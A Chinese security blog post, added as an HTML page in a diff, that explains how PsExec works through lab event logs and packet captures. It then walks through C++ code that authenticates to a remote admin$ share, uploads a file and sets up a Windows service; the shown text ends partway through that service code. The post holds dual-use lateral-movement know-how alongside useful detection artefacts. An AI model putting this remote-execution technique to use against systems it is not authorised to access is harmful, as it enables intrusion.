@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>如何实现一个Psexec</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/projects/" title="Projects">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/tools/" title="Tools">
+                        Tools
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x01-psexec">0x01 Psexec</h2>
+<p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。</p>
+<p>相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程序和技术信息。</p>
+<p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p>
+<p>高级用法：<a href="https://www.itprotoday.com/compute-engines/psexec">https://www.itprotoday.com/compute-engines/psexec</a></p>
+<h2 id="0x02-psexec的执行原理">0x02 Psexec的执行原理</h2>
+<p>为了清楚的了解它的执行原理,我们先从日志看起。</p>
+<p>环境：</p>
+<ul>
+<li>Windows 2008 R2 X64 → 192.168.3.130（以下简称Win2008）</li>
+<li>Kali Linux 2019.4 → 192.168.3.145（以下简称Kali）</li>
+<li>Windows 10 → 192.168.3.1（以下简称Win10）</li>
+</ul>
+<p>下载SysinternalsSuite： <a href="https://download.sysinternals.com/files/SysinternalsSuite.zip">https://download.sysinternals.com/files/SysinternalsSuite.zip</a></p>
+<p>首先在Windows 10上对Windows 2008 R2 X64这台机器进行Psexec</p>
+<pre><code>.\PsExec.exe \\192.168.3.130 -u administrator -p 123456 cmd
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f84fbcc5ac50a640ad1d2970c6e3b517.png" alt="2020-04-01-14-28-01"></p>
+<h3 id="查看安全日志">查看安全日志</h3>
+<p>打开Win2008日志查看器，先查看安全（Security）日志：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dbeee0384038a85830845641f5dd5434.png" alt="2020-04-01-14-28-34"></p>
+<p>从日志查看器能够看到产生了多个安全审核日志，事件ID：4624，并且能够看到来源IP以及计算机名。</p>
+<p><strong>认证类型NTLM：</strong></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/172958824ec3d6e64b5df765a216fae0.png" alt="2020-04-01-14-28-52"></p>
+<p>接着，还有事件ID为4648的日志，该条目的解释是：</p>
+<blockquote>
+<p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。</p>
+</blockquote>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8800ced9f7f21a9999ea2095c9137421.png" alt="2020-04-01-14-29-07"></p>
+<p>可以看到很明显的PSEXECSVC.exe这个程序被启动。</p>
+<p><strong>目前可以猜测：先进行Windows 认证，然后产生PSEXESVC.exe并启动。</strong></p>
+<h3 id="查看系统日志">查看系统日志</h3>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6eeaab1907ebd3e03475c9f151b923c7.png" alt="2020-04-01-14-29-20"></p>
+<p>事件ID：7045向系统报告了一个名为“PSEXESVC”的服务被安装，同时紧接着事件ID：7036报告“PSEXESVC服务已经启动”。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e1702df33a068121dd12f93676b5eee6.png" alt="2020-04-01-14-29-34"></p>
+<p>通过事件ID报告的顺序，我们大致了解了PsEXEC的动作。</p>
+<ol>
+<li>事件ID：4624</li>
+<li>事件ID：4648</li>
+<li>事件ID：7045</li>
+<li>事件ID：7036</li>
+</ol>
+<p>当PsExec执行exit退出交互式命令行后，会向系统报告事件ID：4634注销事件、事件ID：7036 PSEXESVC服务停止。</p>
+<h2 id="0x03-从网络分析psexec利用过程">0x03 从网络分析Psexec利用过程</h2>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a0c6703e974fab0564c0451ea0247caf.png" alt="2020-04-01-14-30-06"></p>
+<p>这里我使用Wireshark抓包工具，捕获了整个Psexec建立网络连接到exit退出的整个过程。</p>
+<p>认证大致流程：</p>
+<ol>
+<li>192.168.3.1向192.168.3.130　进行三次握手</li>
+<li>192.168.3.1向192.168.3.130　协商认证方式</li>
+<li>192.168.3.1向192.168.3.130　发送　NTLMSSP_NEGOTIATE</li>
+<li>192.168.3.130向192.168.3.1　发送　NTLMSSP_CHANLLENGE</li>
+<li>192.168.3.1向192.168.3.130　发送　NTLMSSP_AUTH</li>
+<li>192.168.3.130向192.168.3.1　发送　ACCEPT-COMPLETED，至此完成NTLMSSP认证</li>
+</ol>
+<p>接着向<code>\\192.168.3.130\ADMIN$</code>写入<code>PSEXESVC.exe</code>:</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/993a3393e54b5fdf608c4f92ee1b56fa.png" alt="2020-04-01-14-30-37"></p>
+<p>在SMBV2传输的过程中,文件内容并没有进行加密,可以直接找到DOS头：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dc7735fb04cff646efb082e5bbf75dc5.png" alt="2020-04-01-14-30-53"></p>
+<blockquote>
+<p>其开始的标志字为“MZ”（MarkZbikowski，他是DOS操作系统的开发者之一），所以称它为“DOS MZ头”。</p>
+</blockquote>
+<p>文件传输后，Psexec会调用<code>OpenServiceManager</code> 来安装服务&quot;PSEXESVC&quot;：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7e46cb879e93dd42880f01eb4127fa3a.png" alt="2020-04-01-14-31-14"></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64b132799d5d5481369e0a77907aef5f.png" alt="2020-04-01-14-31-20"></p>
+<p>PSEXESVC服务启动后会与PsExec.exe构建一个管道进行传输数据(还是走SMB V2协议)：</p>
+<blockquote>
+<p><a href="https://www.itprotoday.com/compute-engines/enterprise-guide-quantum-computing">The Psexesvc service creates a named pipe, psexecsvc, to which PsExec connects and sends commands that tell the service on the remote system which executable to launch and which options you&rsquo;ve specified. If you specify the -d (don&rsquo;t wait) switch, the service exits after starting the executable; otherwise, the service waits for the executable to terminate, then sends the exit code back to PsExec for it to print on the local console.</a></p>
+</blockquote>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/80ededdce2786fb71d73467d2356bcf4.png" alt="2020-04-01-14-33-01"></p>
+<p>到这里我想已经差不多足够我们实现一个PsExec了，大致过程如下：</p>
+<ol>
+<li>编写PsEXESVC服务程序</li>
+<li>连接SMB共享</li>
+<li>上传文件到共享目录</li>
+<li>创建服务</li>
+<li>启动服务</li>
+<li>停止服务</li>
+<li>删除服务</li>
+<li>删除文件</li>
+</ol>
+<p>经过搜集资料,我发现主要有以下知识点:</p>
+<ol>
+<li>SMB共享的连接与认证</li>
+<li>SMB共享的文件操作</li>
+<li>管理远程计算机服务</li>
+<li>编写服务程序</li>
+</ol>
+<h2 id="0x04-连接smb共享">0x04 连接SMB共享</h2>
+<p>应用程序可以调用<code>WNetAddConnection</code>函数将本地设备连接到网络资源，成功的连接是持久的，这意味着系统在后续的登录操作期间会自动恢复连接。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">WNetAddConnection2W</span>(
+  LPNETRESOURCEW lpNetResource, <span style="color:#75715e">// 指定建议的连接的详细信息
+</span><span style="color:#75715e"></span>  LPCWSTR        lpPassword, <span style="color:#75715e">// 用户名
+</span><span style="color:#75715e"></span>  LPCWSTR        lpUserName, <span style="color:#75715e">// 密码
+</span><span style="color:#75715e"></span>  DWORD          dwFlags <span style="color:#75715e">// 连接选项
+</span><span style="color:#75715e"></span>);
+</code></pre></div><p>在这里有详细的参数说明:<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p>
+<p><strong>返回值:</strong></p>
+<p>如果函数成功，则返回值为<code>NO_ERROR</code>。</p>
+<p>OK，接下来我们创建一个Windows控制台应用程序,我这里使用的是<code>Visual Studio 2019</code></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/44628225123f88c2a1bfcf2088533263.png" alt="2020-04-01-14-33-54"></p>
+<p>创建一个名字叫Psexec的项目：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b1a0c892a49587bc2f86c113fbb71ec6.png" alt="2020-04-01-14-34-09"></p>
+<p>紧接着就可以写具体的实现代码了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">DWORD <span style="color:#a6e22e">ConnectSMBServer</span>(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)
+{
+    <span style="color:#75715e">// 用于存放SMB共享资源格式
+</span><span style="color:#75715e"></span>    PWCHAR lpwsIPC <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> WCHAR[MAX_PATH]; 
+    DWORD dwRetVal; <span style="color:#75715e">// 函数返回值
+</span><span style="color:#75715e"></span>    NETRESOURCE nr; <span style="color:#75715e">// 连接的详细信息
+</span><span style="color:#75715e"></span>    DWORD dwFlags; <span style="color:#75715e">// 连接选项
+</span><span style="color:#75715e"></span>
+    ZeroMemory(<span style="color:#f92672">&amp;</span>nr, <span style="color:#66d9ef">sizeof</span>(NETRESOURCE));
+    swprintf(lpwsIPC, TEXT(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin$&#34;</span>), lpwsHost);
+    nr.dwType <span style="color:#f92672">=</span> RESOURCETYPE_ANY; <span style="color:#75715e">// 枚举所有资源
+</span><span style="color:#75715e"></span>    nr.lpLocalName <span style="color:#f92672">=</span> NULL;
+    nr.lpRemoteName <span style="color:#f92672">=</span> lpwsIPC; <span style="color:#75715e">// 资源的网络名
+</span><span style="color:#75715e"></span>    nr.lpProvider <span style="color:#f92672">=</span> NULL; 
+
+    <span style="color:#75715e">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。
+</span><span style="color:#75715e"></span>    dwFlags <span style="color:#f92672">=</span> CONNECT_UPDATE_PROFILE; 
+
+    dwRetVal <span style="color:#f92672">=</span> WNetAddConnection2(<span style="color:#f92672">&amp;</span>nr,lpwsPassword, lpwsUserName, dwFlags);
+    <span style="color:#66d9ef">if</span> (dwRetVal <span style="color:#f92672">==</span> NO_ERROR) {
+        <span style="color:#75715e">// 返回NO_ERROR则成功
+</span><span style="color:#75715e"></span>        wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Connection added to %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nr.lpRemoteName);
+        <span style="color:#66d9ef">return</span> dwRetVal;
+    }
+    
+    wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;WNetAddConnection2 failed with error: %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dwRetVal);
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+}
+</code></pre></div><p>测试过程：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a44b2835de7f7018923b522bb5536e0.png" alt="2020-04-01-14-34-46"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> argv[])
+    {
+        std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Hello World!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+        ConnectSMBServer(TEXT(<span style="color:#e6db74">&#34;192.168.3.130&#34;</span>), TEXT(<span style="color:#e6db74">&#34;Administrator&#34;</span>), TEXT(<span style="color:#e6db74">&#34;123456&#34;</span>));
+    }
+</code></pre></div><p>可以看到，传入对应的参数即可建立一个SMB连接。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/303724c2565d0db1f1cab5974243dbb4.png" alt="2020-04-01-14-35-14"></p>
+<p>建立SMB连接后，我们需要继续编写一个通过SMB协议在远程服务器上创建文件的函数。</p>
+<h3 id="关于smb上传文件">关于SMB上传文件</h3>
+<p>说到这里，可能有的朋友觉得实现这个需求会非常的复杂，但是经过我的假设与验证，发现实现起来并不难，在后来的日子里，我获得了PsExec的源代码后，我这个方法比它更加方便直接。</p>
+<p><strong>CIFS（Common Internet File System），它是Windows上的一个文件共享协议。</strong></p>
+<p>CIFS 可以使您达到以下功能：</p>
+<ol>
+<li>访问服务器本地文件并读写这些文件</li>
+<li>与其它用户一起共享一些文件块</li>
+<li>在断线时自动恢复与网络的连接</li>
+<li>使用统一码（Unicode）文件名：文件名可以使用任何字符集，而不局限于为英语或西欧语言设计的字符集。</li>
+</ol>
+<p>通过CIFS协议我们才能够将网络上的文件共享映射为本地资源去访问，大家可能熟悉<code>net use</code></p>
+<p>但不真正了解背后的原理。既然能够将网络文件映射到本地，相当于构建了一个逻辑上的本地磁盘，进而推理出我们直接利用Windows文件相关的API来操作共享文件都是可行的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL <span style="color:#a6e22e">CopyFile</span>( 
+        LPCTSTR lpExistingFileName, <span style="color:#75715e">// 你要拷贝的源文件名 
+</span><span style="color:#75715e"></span>        LPCTSTR lpNewFileName, <span style="color:#75715e">// 你要拷贝的目标文件名 
+</span><span style="color:#75715e"></span>        BOOL bFailIfExists <span style="color:#75715e">// 如果目标已经存在，不拷贝（True）并返回False，覆盖目标（false）
+</span><span style="color:#75715e"></span>    );
+</code></pre></div><p>实现代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">BOOL <span style="color:#a6e22e">UploadFileBySMB</span>(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)
+{
+    DWORD dwRetVal;
+    dwRetVal <span style="color:#f92672">=</span> CopyFile(lpwsSrcPath, lpwsDstPath, FALSE);
+    <span style="color:#66d9ef">return</span> dwRetVal <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> TRUE : FALSE;
+}
+</code></pre></div><p>是不是非常简单，它就像操作本地文件一样简单。</p>
+<p>为了方便测试，我在本地创建了一个<code>test.txt</code> 文本文件，然后我把<code>wmain</code> 更改了一下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">wchar_t</span><span style="color:#f92672">*</span> argv[])
+{
+    std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Hello World!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+    <span style="color:#66d9ef">if</span> (ConnectSMBServer(TEXT(<span style="color:#e6db74">&#34;192.168.3.130&#34;</span>), TEXT(<span style="color:#e6db74">&#34;Administrator&#34;</span>), TEXT(<span style="color:#e6db74">&#34;123456&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+        BOOL bRetVal <span style="color:#f92672">=</span> FALSE;
+        bRetVal<span style="color:#f92672">=</span>UploadFileBySMB(TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Administrator</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">test.txt&#34;</span>), TEXT(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">192.168.3.130</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin$</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">test.txt&#34;</span>));
+        <span style="color:#66d9ef">if</span> (bRetVal) {
+            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Write Success !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+        }
+        <span style="color:#66d9ef">else</span> {
+            std<span style="color:#f92672">::</span>cout <span style="color:#f92672">&lt;&lt;</span> GetLastError() <span style="color:#f92672">&lt;&lt;</span> std<span style="color:#f92672">::</span>endl;
+        }
+    }
+}
+</code></pre></div><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1751da6474c932f7644f8a7cb7450867.png" alt="2020-04-01-14-36-24"></p>
+<p>在Win2008上的<code>C:\Windows\</code>查看：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9673d1575dce4bff91aabee07cdc61b3.png" alt="2020-04-01-14-36-42"></p>
+<p>文件写入成功。</p>
+<h2 id="0x05-编写服务程序">0x05 编写服务程序</h2>
+<p>Windows 服务被设计用于需要在后台运行的应用程序以及实现没有用户交互的任务，并且部分服务是以SYSTEM权限启动。为了编写服务程序，我们需要了解一些关于服务的概念。</p>
+<p>服务控制管理器（SCM：<code>Services Control Manager</code>）是一个管理系统所有服务的进程。当 SCM 启动某个服务时，它等待某个进程的主线程来调用 StartServiceCtrlDispatcher 函数。将分派表传递给 StartServiceCtrlDispatcher。这将把调用进程的主线程转换为控制分派器。该分派器启动一个新线程，该线程运行分派表中每个服务的 ServiceMain 函数分派器还监视程序中所有服务的执行情况。然后分派器将控制请求从 SCM 传给服务。</p>
+<h3 id="servicemain-函数">ServiceMain 函数</h3>
+<p>该函数是服务的入口点。它运行在一个单独的线程当中，这个线程是由控制分派器创建的。ServiceMain 应该尽可能早早为服务注册控制处理器。这要通过调用 RegisterServiceCtrlHadler 函数来实现。</p>
+<p>这里可以直接提供一个服务模板：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  </span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">// Windows 服务代码模板
+</span><span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">// sc create Monitor binpath= Monitor.exe
+</span><span style="color:#75715e">// sc start Monitor
+</span><span style="color:#75715e">// sc delete Monitor
+</span><span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span><span style="color:#75715e">/**********************************************************************************/</span>
+<span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">// New-Service –Name Monitor –DisplayName Monitor –BinaryPathName &#34;D:\Monitor\Monitor.exe&#34; –StartupType Automatic
+</span><span style="color:#75715e">// Start-Service Monitor
+</span><span style="color:#75715e">// Stop-Service Monitor
+</span><span style="color:#75715e">////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span>
+
+
+<span style="color:#75715e">#define SLEEP_TIME 5000                          </span><span style="color:#75715e">/*间隔时间*/</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define LOGFILE &#34;D:\\log.txt&#34;              </span><span style="color:#75715e">/*信息输出文件*/</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+SERVICE_STATUS ServiceStatus;  <span style="color:#75715e">/*服务状态*/</span>
+SERVICE_STATUS_HANDLE hStatus; <span style="color:#75715e">/*服务状态句柄*/</span>
+
+<span style="color:#66d9ef">void</span>  <span style="color:#a6e22e">ServiceMain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv);
+<span style="color:#66d9ef">void</span>  <span style="color:#a6e22e">CtrlHandler</span>(DWORD request);
+<span style="color:#66d9ef">int</span>   <span style="color:#a6e22e">InitService</span>();
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, CHAR <span style="color:#f92672">*</span> argv[])
+{
+    WCHAR WserviceName[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;Monitor&#34;</span>);
+    SERVICE_TABLE_ENTRY ServiceTable[<span style="color:#ae81ff">2</span>];
+    ServiceTable[<span style="color:#ae81ff">0</span>].lpServiceName <span style="color:#f92672">=</span> WserviceName;
+    ServiceTable[<span style="color:#ae81ff">0</span>].lpServiceProc <span style="color:#f92672">=</span> (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+    ServiceTable[<span style="color:#ae81ff">1</span>].lpServiceName <span style="color:#f92672">=</span> NULL;
+    ServiceTable[<span style="color:#ae81ff">1</span>].lpServiceProc <span style="color:#f92672">=</span> NULL;
+    StartServiceCtrlDispatcher(ServiceTable);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">WriteToLog</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> str)
+{
+    FILE<span style="color:#f92672">*</span> pfile;
+    fopen_s(<span style="color:#f92672">&amp;</span>pfile, LOGFILE, <span style="color:#e6db74">&#34;a+&#34;</span>);
+    <span style="color:#66d9ef">if</span> (pfile <span style="color:#f92672">==</span> NULL)
+    {
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+    fprintf_s(pfile, <span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str);
+    fclose(pfile);
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#75715e">/*Service initialization*/</span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">InitService</span>()
+{
+    CHAR Message[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Monitoring started.&#34;</span>;
+    OutputDebugString(TEXT(<span style="color:#e6db74">&#34;Monitoring started.&#34;</span>));
+    <span style="color:#66d9ef">int</span> result;
+    result <span style="color:#f92672">=</span> WriteToLog(Message);
+
+    <span style="color:#66d9ef">return</span>(result);
+}
+
+<span style="color:#75715e">/*Control Handler*/</span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">CtrlHandler</span>(DWORD request)
+{
+    <span style="color:#66d9ef">switch</span> (request)
+    {
+    <span style="color:#66d9ef">case</span> SERVICE_CONTROL_STOP:
+        
+        WriteToLog(<span style="color:#e6db74">&#34;Monitoring stopped.&#34;</span>);
+        ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        ServiceStatus.dwCurrentState <span style="color:#f92672">=</span> SERVICE_STOPPED;
+        SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+        <span style="color:#66d9ef">return</span>;
+    <span style="color:#66d9ef">case</span> SERVICE_CONTROL_SHUTDOWN:
+        WriteToLog(<span style="color:#e6db74">&#34;Monitoring stopped.&#34;</span>);
+
+        ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        ServiceStatus.dwCurrentState <span style="color:#f92672">=</span> SERVICE_STOPPED;
+        SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+        <span style="color:#66d9ef">return</span>;
+    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+        <span style="color:#66d9ef">break</span>;
+    }
+    <span style="color:#75715e">/* Report current status  */</span>
+    SetServiceStatus(hStatus, <span style="color:#f92672">&amp;</span>ServiceStatus);
+    <span style="color:#66d9ef">return</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ServiceMain</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
+{
+    WCHAR WserviceName[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;Monitor&#34;</span>);
+    <span style="color:#66d9ef">int</span> error;
+    ServiceStatus.dwServiceType <span style="color:#f92672">=</span>
+        SERVICE_WIN32;
+    ServiceStatus.dwCurrentState <span style="color:#f92672">=</span>
+        SERVICE_START_PENDING;
+    <span style="color:#75715e">/*在本例中只接受系统关机和停止服务两种控制命令*/</span>
+    ServiceStatus.dwControlsAccepted <span style="color:#f92672">=</span>
+        SERVICE_ACCEPT_SHUTDOWN <span style="color:#f92672">|</span>
+        SERVICE_ACCEPT_STOP;
+    ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    ServiceStatus.dwServiceSpecificExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    ServiceStatus.dwCheckPoint <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    ServiceStatus.dwWaitHint <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    hStatus <span style="color:#f92672">=</span> <span style="color:#f92672">::</span>RegisterServiceCtrlHandler(
+        WserviceName,
+        (LPHANDLER_FUNCTION)CtrlHandler);
+    <span style="color:#66d9ef">if</span> (hStatus <span style="color:#f92672">==</span> (SERVICE_STATUS_HANDLE)<span style="color:#ae81ff">0</span>)
+    {
+
+        WriteToLog(<span style="color:#e6db74">&#34;RegisterServiceCtrlHandler failed&#34;</span>);
+        <span style="color:#66d9ef">return</span>;
+    }
+    WriteToLog(<span style="color:#e6db74">&#34;RegisterServiceCtrlHandler success&#34;</span>);
+    <span style="color:#75715e">/* Initialize Service   */</span>
+    error <span style="color:#f92672">=</span> InitService();
+    <span style="color:#66d9ef">if</span> (error)
+    {
+        <span style="color:#75715e">/* Initialization failed  */</span>
+        ServiceStatus.dwCurrentState <span style="color:#f92672">=</span>
+            SERVICE_STOPPED;
+        ServiceStatus.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
